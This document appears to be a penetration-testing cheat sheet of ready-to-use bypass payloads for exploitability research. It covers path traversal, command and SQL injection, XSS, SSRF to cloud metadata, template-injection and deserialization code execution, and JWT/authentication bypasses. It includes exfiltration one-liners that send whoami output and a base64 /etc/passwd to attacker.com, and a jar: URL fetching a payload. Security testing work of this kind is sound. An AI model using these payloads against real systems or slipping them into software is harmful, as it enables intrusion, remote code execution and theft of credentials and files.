# Security Control Bypass Techniques

Quick reference for common security control bypasses during exploitability research.

## Input Validation Bypasses

### Character Filters

| Blocked | Bypass Techniques |
|---------|-------------------|
| `<` `>` | HTML entities: `&lt;` `&gt;`, URL: `%3C` `%3E` |
| `'` `"` | Backticks, no quotes, template literals |
| Spaces | `%20`, `+`, `%09` (tab), `/**/`, `${IFS}` |
| Newlines | `%0a`, `%0d`, `\n`, `\r` |
| Null byte | `%00` (older systems) |
| Unicode | Normalization issues, homoglyphs |

### Encoding Bypasses

```
URL encoding:     %2e%2e%2f = ../
Double encoding:  %252e%252e%252f = ../
UTF-8 overlong:   %c0%ae = . (some parsers)
Unicode:          ..%u2216 = ..\ on Windows
```

### Case Sensitivity

```
<SCRIPT> <ScRiPt> <script>
SELECT UNION select union SeLeCt UnIoN
../ETC/PASSWD (Windows case-insensitive)
```

### Type Juggling (PHP)

```php
"0e123" == 0      // true (scientific notation)
"0" == false      // true
"abc" == 0        // true
[] == false       // true
NULL == false     // true
```

### Type Coercion (JavaScript)

```javascript
"1" == 1          // true
[] == ""          // true
[] == false       // true
[null] == ""      // true
```

## Path Traversal Bypasses

### Basic Sequences

| Sequence | Description |
|----------|-------------|
| `../` | Standard directory up |
| `..\` | Windows backslash |
| `....//` | Double encoding after filter |
| `..%00/` | Null byte injection |
| `..%252f` | Double URL encode |
| `.%2e/` | Partial encoding |

### Path Normalization Issues

```
# Path.join vulnerability (Node.js, Python)
path.join("/safe/", "../../../etc/passwd")
# May return: "/etc/passwd" if not validated after join

# URL path normalization
/files/download?path=....//....//etc/passwd
# Filter removes ../ once, leaves ../
```

### Protocol Handlers

```
file:///etc/passwd
file://localhost/etc/passwd
php://filter/convert.base64-encode/resource=config.php
jar:http://attacker.com/evil.jar!/payload.class
```

### Symlink Traversal

```bash
# If app follows symlinks after validation
ln -s /etc/passwd /allowed/path/link
# Request: /allowed/path/link → reads /etc/passwd
```

### Windows-Specific

```
C:..\..\Windows\System32\config\SAM
\\?\C:\Windows\System32\config\SAM  # Extended path
CON, PRN, AUX, NUL  # Reserved device names
file.txt::$DATA  # Alternate data streams
```

## Command Injection Bypasses

### Command Separators

| Separator | Usage |
|-----------|-------|
| `;` | `cmd; malicious` |
| `\|` | `cmd \| malicious` |
| `&` | `cmd & malicious` (background) |
| `&&` | `cmd && malicious` (if success) |
| `\|\|` | `cmd \|\| malicious` (if fail) |
| `\n` | `cmd%0amalicious` |
| `` `cmd` `` | Command substitution |
| `$(cmd)` | Command substitution |

### Space Bypasses

```bash
cat${IFS}/etc/passwd
cat$IFS/etc/passwd
cat</etc/passwd
cat%09/etc/passwd
{cat,/etc/passwd}
X=$'cat\x20/etc/passwd'&&$X
```

### Quote Escapes

```bash
# Inside single quotes - no escape possible
# Inside double quotes:
"$(whoami)"
"`whoami`"
"$PATH"
```

### Character Restrictions

```bash
# No letters?
$'\x63\x61\x74' /etc/passwd  # cat

# No slashes?
cd ..;cd ..;cd etc;cat passwd
```

### Blind Command Injection

```bash
# Time-based
sleep 10
ping -c 10 127.0.0.1

# DNS exfiltration
nslookup $(whoami).attacker.com
curl attacker.com/$(cat /etc/passwd | base64)
```

## SQL Injection Bypasses

### Comment Techniques

```sql
SELECT/**/1/**/FROM/**/users
SELECT%09username%09FROM%09users
SELECT/**_**/username/**_**/FROM/**_**/users
```

### String Bypass

```sql
-- Instead of 'admin':
CHAR(97,100,109,105,110)
0x61646d696e
concat(char(97),char(100)...)
```

### Keyword Bypass

```sql
SeLeCt  -- Case mixing
SEL/**/ECT  -- Comment injection
SESELECTLECT  -- Double write (filter removes once)
%53ELECT  -- URL encoding
```

### Filter Evasion

```sql
-- No spaces:
'or'1'='1
'||'1'='1

-- No quotes:
1 or 1=1
1 and 1=1

-- No equals:
1 or 1 LIKE 1
1 or 1 BETWEEN 1 AND 1
```

### Time-Based Blind

```sql
-- MySQL
SLEEP(5)
BENCHMARK(10000000,SHA1('test'))

-- PostgreSQL
pg_sleep(5)

-- SQLite
LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))

-- MSSQL
WAITFOR DELAY '0:0:5'
```

## XSS Bypasses

### Tag Alternatives

```html
<svg onload=alert(1)>
<img src=x onerror=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
```

### Event Handler Alternatives

```html
<svg/onload=alert(1)>
<svg onload%3Dalert(1)>
<svg%20onload=alert(1)>
<svg	onload=alert(1)>  <!-- tab -->
```

### JavaScript Protocol

```html
<a href="javascript:alert(1)">
<a href="JaVaScRiPt:alert(1)">
<a href="javascript&#58;alert(1)">
<a href="&#106;avascript:alert(1)">
```

### DOM-Based Payloads

```javascript
location='javascript:alert(1)'
location.href='javascript:alert(1)'
eval(location.hash.slice(1))
document.write(location.search)
```

### Filter Evasion

```html
<!-- No parentheses -->
<img src=x onerror=alert`1`>
<img src=x onerror="window['alert'](1)">

<!-- No alert -->
<img src=x onerror=prompt(1)>
<img src=x onerror=confirm(1)>
<img src=x onerror="top['al'+'ert'](1)">
```

## SSRF Bypasses

### IP Address Formats

```
http://127.0.0.1
http://127.1
http://0.0.0.0
http://0
http://localhost
http://[::1]
http://[0:0:0:0:0:0:0:1]
http://2130706433  # Decimal for 127.0.0.1
http://0x7f.0.0.1  # Hex
http://017700000001  # Octal
```

### DNS Rebinding

```
# Domain that resolves to 127.0.0.1
http://localtest.me
http://127.0.0.1.nip.io
http://spoofed.burpcollaborator.net  # With DNS rebind
```

### URL Parser Confusion

```
http://evil.com#@expected.com
http://expected.com@evil.com
http://evil.com\@expected.com
http://127.0.0.1:80\@google.com
```

### Redirect Bypass

```
# Open redirect chains to internal
http://trusted.com/redirect?url=http://127.0.0.1
```

### Protocol Smuggling

```
gopher://127.0.0.1:25/_MAIL...
dict://127.0.0.1:11211/stats
file:///etc/passwd
```

### Cloud Metadata

```
# AWS
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data/

# GCP
http://metadata.google.internal/computeMetadata/v1/

# Azure
http://169.254.169.254/metadata/instance

# Kubernetes
https://kubernetes.default.svc/
```

## SSTI Bypasses

### Jinja2 (Python)

```python
{{config}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{''.__class__.__mro__[1].__subclasses__()}}
```

### Twig (PHP)

```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

### Freemarker (Java)

```java
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
${"freemarker.template.utility.Execute"?new()("id")}
```

### ERB (Ruby)

```ruby
<%= system('id') %>
<%= `id` %>
<%= IO.popen('id').read %>
```

### Filter Bypass

```python
# If . is blocked (Jinja2)
{{request['application']['__globals__']}}
{{request|attr('application')}}

# If _ is blocked
{{request['\x5f\x5fclass\x5f\x5f']}}
```

## Deserialization Bypasses

### PHP Object Injection

```php
O:8:"stdClass":1:{s:4:"test";s:4:"data";}
# Use property-oriented programming (POP chains)
```

### Python Pickle

```python
import pickle
import os
class Exploit:
    def __reduce__(self):
        return (os.system, ('id',))
pickle.dumps(Exploit())
```

### Java

```
# ysoserial gadget chains
java -jar ysoserial.jar CommonsCollections5 'id' | base64
```

### Node.js (node-serialize)

```javascript
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()"}
```

## Authentication Bypasses

### JWT Attacks

```
# Algorithm confusion: Change RS256 to HS256
# Use public key as HMAC secret

# None algorithm
{"alg":"none"}

# Key injection
{"alg":"HS256","kid":"../../../../../../dev/null"}
```

### Session Fixation

```
# Force known session ID before auth
Set-Cookie: PHPSESSID=attacker_known_value
```

### Type Juggling Auth

```php
# strcmp bypass
password[]=x  # strcmp returns null, null == 0 is true

# Array bypass
username[]=admin&password[]=  # May bypass string comparison
```
